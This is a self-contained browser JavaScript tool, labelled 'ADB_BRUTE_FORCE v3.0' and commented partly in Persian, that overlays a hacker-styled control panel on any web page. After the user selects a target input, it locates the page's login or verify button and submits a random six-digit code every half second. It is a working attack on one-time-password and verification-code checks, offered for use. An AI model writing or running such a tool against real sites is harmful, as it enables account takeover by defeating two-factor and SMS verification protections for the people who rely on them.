(function() {
    if (document.getElementById('adb-otp-panel')) document.getElementById('adb-otp-panel').remove();

    const style = document.createElement('style');
    style.textContent = `
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        #adb-otp-panel {
            position: fixed; top: 20px; right: 20px; width: 330px;
            background: rgba(5, 5, 5, 0.95); border: 1px solid #00FF41;
            border-radius: 8px; padding: 0; overflow: hidden;
            font-family: 'Share Tech Mono', 'Courier New', monospace;
            color: #00FF41; z-index: 9999999; direction: ltr;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2), inset 0 0 20px rgba(0, 255, 65, 0.05);
            animation: adb-boot 0.5s ease-out;
        }
        @keyframes adb-boot { 0% { opacity: 0; transform: scaleY(0.01) translateY(-20px); } 50% { opacity: 1; transform: scaleY(1.05); } 100% { opacity: 1; transform: scaleY(1) translateY(0); } }
        
        #adb-otp-panel .adb-header {
            background: #0a1a0a; padding: 8px 12px; border-bottom: 1px solid #00FF41;
            display: flex; justify-content: space-between; align-items: center;
            font-size: 13px; font-weight: bold; letter-spacing: 1px; position: relative;
            cursor: grab; user-select: none;
        }
        #adb-otp-panel .adb-header:active { cursor: grabbing; }
        #adb-otp-panel .adb-header::after {
            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.2), transparent);
            animation: adb-scanline 2s linear infinite; pointer-events: none;
        }
        @keyframes adb-scanline { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
        
        #adb-otp-panel .adb-header .dots span {
            display: inline-block; width: 8px; height: 8px; border-radius: 50%;
            margin-right: 5px; background: #00FF41; box-shadow: 0 0 5px #00FF41;
            animation: adb-pulse 1.5s infinite;
        }
        @keyframes adb-pulse { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; box-shadow: 0 0 10px #00FF41; } }
        
        #adb-otp-panel .adb-body { padding: 15px; position: relative; }

        #adb-otp-panel .adb-log {
            font-size: 11px; color: #008f11; margin-bottom: 12px;
            line-height: 1.5; min-height: 60px; border-left: 2px solid #008f11;
            padding-left: 10px; position: relative; z-index: 1; max-height: 120px; overflow-y: auto;
        }
        #adb-otp-panel .adb-log .highlight { color: #00FF41; text-shadow: 0 0 5px #00FF41; }
        #adb-otp-panel .adb-log .error { color: #FF003C; text-shadow: 0 0 5px #FF003C; }
        #adb-otp-panel .adb-log .warn { color: #FFB000; text-shadow: 0 0 5px #FFB000; }

        #adb-otp-panel .adb-display {
            width: 100%; padding: 15px; background: #000; border: 1px solid #00FF41;
            color: #00FF41; font-size: 28px; font-family: monospace; text-align: center;
            border-radius: 4px; letter-spacing: 8px; margin-bottom: 15px;
            box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.2); text-shadow: 0 0 10px #00FF41;
        }

        #adb-otp-panel button {
            width: 100%; padding: 12px; background: #000; color: #00FF41;
            border: 1px solid #00FF41; font-family: 'Share Tech Mono', monospace;
            font-size: 14px; font-weight: bold; cursor: pointer; border-radius: 4px;
            margin-bottom: 8px; transition: all 0.2s; text-transform: uppercase; letter-spacing: 1px;
        }
        #adb-otp-panel button:hover { background: #00FF41; color: #000; box-shadow: 0 0 20px #00FF41; }
        #adb-otp-panel button:active { transform: scale(0.98); }
        
        #adb-btn-start { border-color: #00FF41; color: #00FF41; animation: adb-glow-pulse 2s infinite; }
        #adb-btn-start:hover { background: #00FF41; color: #000; }
        #adb-btn-stop { border-color: #FF003C; color: #FF003C; }
        #adb-btn-stop:hover { background: #FF003C; color: #000; box-shadow: 0 0 20px #FF003C; }
        
        #adb-otp-panel .adb-footer { font-size: 9px; color: #005a1a; text-align: center; border-top: 1px dashed #005a1a; padding-top: 8px; margin-top: 5px; letter-spacing: 1px; }
    `;
    document.head.appendChild(style);

    const panel = document.createElement('div');
    panel.id = 'adb-otp-panel';
    panel.innerHTML = `
        <div class="adb-header" id="adb-drag-handle">
            <span>ADB_BRUTE_FORCE v3.0</span>
            <div class="dots"><span></span><span></span><span></span></div>
        </div>
        <div class="adb-body">
            <div class="adb-log" id="adb-log">
                <span class="highlight">root@adb:~#</span> System ready.<br>
                <span class="highlight">root@adb:~#</span> Select target input first.<br>
            </div>
            
            <div class="adb-display" id="adb-display">------</div>

            <button id="adb-btn-pick">[ 1 ] SELECT TARGET INPUT</button>
            <button id="adb-btn-start">[ 2 ] START AUTO-BRUTE</button>
            <button id="adb-btn-stop">[ ! ] STOP ATTACK</button>
            
            <div class="adb-footer">ADB SECURITY TOOL // BRUTE FORCE ACTIVE</div>
        </div>
    `;
    document.body.appendChild(panel);

    // === Drag & Drop ===
    const dragHandle = document.getElementById('adb-drag-handle');
    let isDragging = false, offsetX = 0, offsetY = 0;
    dragHandle.addEventListener('mousedown', (e) => {
        isDragging = true; const rect = panel.getBoundingClientRect();
        offsetX = e.clientX - rect.left; offsetY = e.clientY - rect.top;
        panel.style.right = 'auto'; panel.style.bottom = 'auto';
        panel.style.left = rect.left + 'px'; panel.style.top = rect.top + 'px';
        panel.style.cursor = 'grabbing';
    });
    dragHandle.addEventListener('touchstart', (e) => {
        isDragging = true; const rect = panel.getBoundingClientRect();
        offsetX = e.touches[0].clientX - rect.left; offsetY = e.touches[0].clientY - rect.top;
        panel.style.right = 'auto'; panel.style.bottom = 'auto';
        panel.style.left = rect.left + 'px'; panel.style.top = rect.top + 'px';
        e.preventDefault();
    }, { passive: false });
    document.addEventListener('mousemove', (e) => {
        if (!isDragging) return;
        panel.style.left = Math.max(0, Math.min(window.innerWidth - panel.offsetWidth, e.clientX - offsetX)) + 'px';
        panel.style.top = Math.max(0, Math.min(window.innerHeight - panel.offsetHeight, e.clientY - offsetY)) + 'px';
    });
    document.addEventListener('touchmove', (e) => {
        if (!isDragging) return;
        panel.style.left = Math.max(0, Math.min(window.innerWidth - panel.offsetWidth, e.touches[0].clientX - offsetX)) + 'px';
        panel.style.top = Math.max(0, Math.min(window.innerHeight - panel.offsetHeight, e.touches[0].clientY - offsetY)) + 'px';
        e.preventDefault();
    }, { passive: false });
    document.addEventListener('mouseup', () => { isDragging = false; });
    document.addEventListener('touchend', () => { isDragging = false; });

    // === منطق اصلی بروت فورس ===
    let targetInput = null;
    let targetSubmit = null;
    let isBruteForcing = false;
    let bruteTimer = null;
    
    const logEl = document.getElementById('adb-log');
    const displayEl = document.getElementById('adb-display');

    function log(text, type = 'normal') {
        let textClass = type === 'error' ? 'error' : type === 'warn' ? 'warn' : type === 'success' ? 'highlight' : '';
        const newLog = document.createElement('div');
        newLog.innerHTML = `<span class="highlight">root@adb:~#</span> <span class="${textClass}">${text}</span>`;
        logEl.appendChild(newLog);
        logEl.scrollTop = logEl.scrollHeight; // اسکرول خودکار به پایین
    }

    function findSubmitButton() {
        const btns = Array.from(document.querySelectorAll('button, input[type="submit"], div[role="button"]'));
        const keywords = ['تایید', 'ثبت', 'ورود', 'ادامه', 'ارسال', 'submit', 'login', 'next', 'verify', 'confirm'];
        for (const btn of btns) {
            const text = (btn.innerText || btn.value || btn.ariaLabel || '').toLowerCase();
            if (keywords.some(k => text.includes(k))) {
                if (btn.offsetParent !== null) return btn;
            }
        }
        return null;
    }

    document.getElementById('adb-btn-pick').onclick = () => {
        log('Click on the target input field...', 'warn');
        const handler = (e) => {
            e.preventDefault(); e.stopPropagation();
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                targetInput = e.target;
                targetSubmit = findSubmitButton();
                log(targetSubmit ? 'Target acquired. [Submit button FOUND]' : 'Target acquired. [Submit NOT found]', 'success');
                
                // افکت چشمک
                let blinks = 0;
                const blinkInt = setInterval(() => {
                    targetInput.style.outline = blinks % 2 === 0 ? '2px solid #00FF41' : 'none';
                    blinks++;
                    if (blinks > 5) { clearInterval(blinkInt); targetInput.style.outline = ''; }
                }, 200);
            } else {
                log('Invalid target.', 'error');
            }
            document.removeEventListener('click', handler, true);
        };
        setTimeout(() => document.addEventListener('click', handler, true), 100);
    };

    // تابع تزریق کد و کلیک
    function injectCode(code) {
        if (!targetInput) return;
        const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
        setter.call(targetInput, code);
        targetInput.dispatchEvent(new Event('input', { bubbles: true }));
        targetInput.dispatchEvent(new Event('change', { bubbles: true }));
        
        // پاک کردن کادر بعد از نیم ثانیه برای کد بعدی
        setTimeout(() => {
            if (targetInput) {
                setter.call(targetInput, "");
                targetInput.dispatchEvent(new Event('input', { bubbles: true }));
            }
        }, 200); 

        if (targetSubmit) targetSubmit.click();
    }

    document.getElementById('adb-btn-start').onclick = () => {
        if (!targetInput) return alert('اول کادر رو انتخاب کن!');
        if (isBruteForcing) return;
        
        isBruteForcing = true;
        log('Starting brute-force...', 'warn');
        
        bruteTimer = setInterval(() => {
            if (!isBruteForcing) return;
            
            // تولید عدد رندوم 6 رقمی
            const randomCode = Math.floor(Math.random() * 900000) + 100000;
            displayEl.textContent = randomCode;
            
            // تزریق به کادر
            injectCode(randomCode);
            
            log(`Injected: ${randomCode}`, 'highlight');
        }, 500); // هر نیم ثانیه یک بار
    };

    document.getElementById('adb-btn-stop').onclick = () => {
        isBruteForcing = false;
        clearInterval(bruteTimer);
        log('STOPPED.', 'error');
    };

    console.log('🟢 ADB Brute-Force loaded.');
})();